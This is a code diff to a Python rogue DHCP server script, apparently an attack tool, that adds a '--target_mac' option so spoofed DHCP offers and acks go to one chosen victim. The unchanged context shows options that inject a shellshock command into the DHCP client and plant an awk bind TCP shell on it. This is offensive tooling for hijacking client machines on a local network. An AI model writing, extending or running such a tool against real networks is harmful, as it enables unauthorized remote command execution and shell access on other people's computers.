@@ -18,6 +18,7 @@ parser = ArgumentParser(description='DHCP Reply (Offer and Ack) sender')
 parser.add_argument('-i', '--interface', help='Set interface name for send reply packets')
 parser.add_argument('-f', '--first_offer_ip', type=str, required=True, help='Set first client ip for offering')
 parser.add_argument('-l', '--last_offer_ip', type=str, required=True, help='Set last client ip for offering')
+parser.add_argument('-t', '--target_mac', type=str, help='Set target MAC address', default=None)
 
 parser.add_argument('-c', '--shellshock_command', type=str, help='Set shellshock command in DHCP client')
 parser.add_argument('-b', '--bind_shell', action='store_true', help='Use awk bind tcp shell in DHCP client')
@@ -321,8 +322,14 @@ def dhcp_reply(request):
                 print "[INFO] Send ack response!"
 
 if __name__ == "__main__":
-    print "Waiting for a DHCP DISCOVER, DHCP REQUEST or DHCP INFORM ..."
-    sniff(lfilter=lambda d: d.src != eth.get_mac_for_dhcp_discover() and
-                            d.src != Base.get_netiface_mac_address(current_network_interface),
-          filter="udp and src port 68 and dst port 67 and dst host 255.255.255.255",
-          prn=dhcp_reply, iface=current_network_interface)
+    if args.target_mac is None:
+        print "Waiting for a DHCP DISCOVER, DHCP REQUEST or DHCP INFORM ..."
+        sniff(lfilter=lambda d: d.src != eth.get_mac_for_dhcp_discover() and
+                                d.src != Base.get_netiface_mac_address(current_network_interface),
+              filter="udp and src port 68 and dst port 67 and dst host 255.255.255.255",
+              prn=dhcp_reply, iface=current_network_interface)
+    else:
+        print "Waiting for a DHCP DISCOVER, DHCP REQUEST or DHCP INFORM from " + args.target_mac + " ..."
+        sniff(lfilter=lambda d: d.src == args.target_mac,
+              filter="udp and src port 68 and dst port 67",
+              prn=dhcp_reply, iface=current_network_interface)
